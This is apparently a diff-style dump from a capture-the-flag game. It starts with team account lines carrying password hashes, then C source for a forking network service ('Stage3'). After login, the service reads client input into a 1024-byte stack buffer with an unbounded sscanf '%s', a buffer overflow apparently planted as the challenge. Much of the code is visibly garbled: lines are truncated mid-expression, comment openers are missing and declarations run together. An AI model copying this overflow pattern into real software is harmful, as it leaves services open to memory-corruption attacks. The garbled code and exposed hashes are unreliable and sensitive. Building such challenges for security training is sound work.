+team319:$1$yJ$irh5MevWyP4cutOf4DtbB.:1245:665::0:0:Rahzan:/home/team319:/usr/sbin/nologin
+team320:$1$sp$L2SUrEmIexGImxMscmFEC.:1246:665::0:0:RacerX:/home/team320:/usr/sbin/nologin
+team321:$1$QN$QuZB/quA1zCtCU/.fCjPx.:1247:665::0:0:defconhackers:/home/team321:/usr/sbin/nologin
+team322:$1$lR$5QQlvPxt5hwSYczNiZlyC/:1248:665::0:0:juk80x:/home/team322:/usr/sbin/nologin
+team323:$1$oy$cHPbitaTcoO/4dupSLkp2/:1249:665::0:0:yellow42:/home/team323:/usr/sbin/nologin
+
+
+
+Stage3 Source Code?
+-------------------
+#include "stage3.h"
+int  sig;
+int  children;
+int  numblock;
+char input_buffer[2048] = {0};
+char**block;
+ * usage() - print usage if called without proper arguments
+ */
+void
+usage(char *argv[])
+{
+fprintf(stderr, "Usage: %s [port]\n", argv[0]);
+exit(1);
+}
+ * _sighandler(int) - set kproxy_sig to the signal number
+ */
+void
+_sighandler(int signo)
+{
+sig = signo;
+return;
+}
+ * _sigchldhandler(int) - call waitpid for children, ganked from stevens' UNP
+ */
+void
+_sigchldhandler(int signo)
+{
+pid_tpid;
+intstat;
+while ( (pid = waitpid(-1, &stat, WNOHANG))
+}
+}
+ * init(int *, sockaddr_in) - set up signal handling, bind socket, write
+ *     pid to PIDFILE, do a little dance
+ */
+void
+init(int *infd, struct sockaddr_in servaddr)
+{
+FILE*fp;
+if ((fp = fopen(PIDFILE, "w")) != NULL) {
+fprintf(fp, "%d\n", getpid());
+fchmod(fileno(fp), 0644);
+}
+else
+warn("%% Unable to write PIDFILE (nonlethal)");
+sig = 0;
+if (signal(SIGHUP, _sighandler) == SIG_ERR) {
+perror("%% Unable to set SIGHUP handler");
+cleanup(*infd);
+exit(0);
+}
+if (signal(SIGINT, _sighandler) == SIG_ERR) {
+perror("%% Unable to set SIGINT handler");
+cleanup(*infd);
+exit(0);
+}
+if (signal(SIGCHLD, _sigchldhandler) == SIG_ERR) {
+perror("%% Unable to set SIGCHLD handler");
+cleanup(*infd);
+exit(0);
+}
+if ((*infd = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
+perror("%% Unable to create socket");
+cleanup(*infd);
+exit(0);
+}
+if (bind(*infd, (SA *) &servaddr, sizeof(servaddr)) == -1) {
+perror("%% Unable to bind socket");
+cleanup(*infd);
+exit(0);
+}
+if (listen(*infd, QSIZE) == -1) {
+perror("%% Unable to listen on socket");
+cleanup(*infd);
+exit(0);
+}
+}
+ * loop() - do all the stuff, make a little love
+ */
+void
+loop(int infd, struct sockaddr_in servaddr)
+{
+intchildfd;
+size_tlen;
+pid_tpid;
+fd_setready;
+struct timevalto;
+struct sockaddr_inclientaddr;
+for (;;) {
+if (sig) {
+cleanup(infd);
+if (sig == SIGHUP) {
+fprintf(stderr, "Restarting...\n");
+init(&infd, servaddr);
+} else {
+ fprintf(stderr, "Shutting down...\n");
+ exit(1);
+}
+}
+FD_ZERO(&ready);
+FD_SET(infd, &ready);
+to.tv_sec = 5;
+to.tv_usec = 0;
+continue;
+if (FD_ISSET(infd, &ready)) {
+  len = sizeof (clientaddr);
+  if ((childfd = accept(infd, (SA *) &clientaddr, &len))==-1) {
+continue;
+perror("% accept error");
+cleanup(infd);
+exit(0);
+  }
+  /* fork a child process to handle the connection */
+  if ((pid = fork()) == -1) {
+perror("% Unable to fork");
+cleanup(infd);
+exit(0);
+  }
+  /* Child loop */
+  if (pid == 0) {
+close(infd);
+chldrqst(childfd);
+close(childfd);
+exit(1);
+  }
+  close(childfd);
+}
+}
+}
+ * cleanup(int) - unlink PIDFILE, close descriptors, get down tonight
+ */
+void
+cleanup(int infd)
+{
+close(infd);
+unlink(PIDFILE);
+}
+ * fail() - Go down in a ball of flames with the following message to client
+ */
+void
+fail(int fd, const char *msg, ...)
+{
+    va_list ap;
+    char buf[1024];
+    va_start(ap, msg);
+    int len = 0;
+    char *error = "Message Error\n";
+    len = vsnprintf(buf, 1023, msg, ap);
+    if (len
+        write(fd, error, strlen(error));
+    else
+        write(fd, buf, len);
+    close(fd);
+    exit(-1);
+}
+ * drop_privs() - become this uid with NO potential for setresuid(0) etc
+ * And change to their home directory (almost straight from openssh)
+ */
+int
+drop_privs(struct passwd *pw)
+{
+uid_t old_uid = getuid();
+gid_t old_gid = getgid();
+if (initgroups(pw-
+        return(-1);
+        return(-1);
+        return(-1);
+if (old_gid != pw-
+        return(-1);
+if (old_uid != pw-
+        return(-1);
+if (getgid() != pw-
+        return(-1);
+if (getuid() != pw-
+        return(-1);
+    if (chdir(pw-
+        return(-1);
+    return(0);
+}
+ * check_user() - Check if a user/password combo is valid and return struct
+ * passwd *. return NULL on failure (only werks for users in the "teams" group)
+ */
+struct passwd *check_user(char *name, char *password) {
+    struct passwd *pass = NULL;
+    struct group *group = NULL;
+    char *crypted = NULL;
+    group = getgrnam("teams");
+    if (!group) {
+        return(NULL);
+    }
+    /* FIXME do password checking here */
+    pass = getpwnam(name);
+    if (!pass)
+        return(NULL);
+    if (pass-
+        return(NULL);
+    crypted = crypt(password, pass-
+    if (strcmp(crypted,pass-
+        return(NULL);
+    return(pass);
+}
+ * authenticate() - Read the user/password from the socket and become that user
+ * return 0 on sucess, -1 on failure
+ */
+int
+authenticate(int fd)
+{
+    int i;
+    int length = 0;
+    char *auth = "AUTH";
+    char *token = input_buffer;
+    /* The AUTH:user:password tokens */
+    char *toks[3] = { NULL, NULL, NULL };
+    struct passwd *user = NULL;
+    bzero(input_buffer, sizeof(input_buffer));
+    length = read(fd, input_buffer, sizeof(input_buffer)-1);
+        toks[i] = strsep(&token, ":");
+        if (toks[i] == NULL)
+            fail(fd, "Protocol Failure");
+    }
+if (input_buffer[i] == '\n')
+            input_buffer[i] = '\0';
+    if (strncmp(auth, toks[0], strlen(auth)) != 0)
+        fail(fd, "Tag Failure");
+    if ((user = check_user(toks[1], toks[2])) == NULL)
+        fail(fd, "Authentication Failure");
+    if (drop_privs(user) != 0)
+        fail(fd, "Failed Dropping Privs");
+    return(0);
+}
+ * chldrqst() - read from the client and send request out for processing
+ */
+int
+chldrqst(int childfd)
+{
+intlength;
+charrapeme[1024] = {0};
+    int authenticated = 0;
+    /* This will exit directly on failure */
+    authenticate(childfd);
+    write(childfd, "OK\n", 3);
+length = read(childfd, input_buffer, sizeof(input_buffer)-1);
+sscanf(input_buffer, "bacon:%s", rapeme);
+length = strlen(rapeme);
+write(childfd, length ? rapeme : TURNIPS,
+length ? length : strlen(TURNIPS));
+return (1);
+}
+ * main() -
+ */
+int
+main(int argc, char *argv[])
+{
+intinfd;
+in_port_tport;
+struct sockaddr_inservaddr;
+usage(argv);
+numblock = argc-2;
+block = &(argv[2]);
+port = (in_port_t)strtoul(argv[1], (char **)NULL, 10);
+memset(&servaddr, 0, sizeof(servaddr));
+servaddr.sin_family= AF_INET;
+servaddr.sin_addr.s_addr= htonl(INADDR_ANY);
+servaddr.sin_port= htons(port);
+    /* Split off from the controlling terminal */
+    daemon(1,0);
+    init(&infd, servaddr);
+    loop(infd, servaddr);
+    cleanup(infd);
+    return(1);
+}
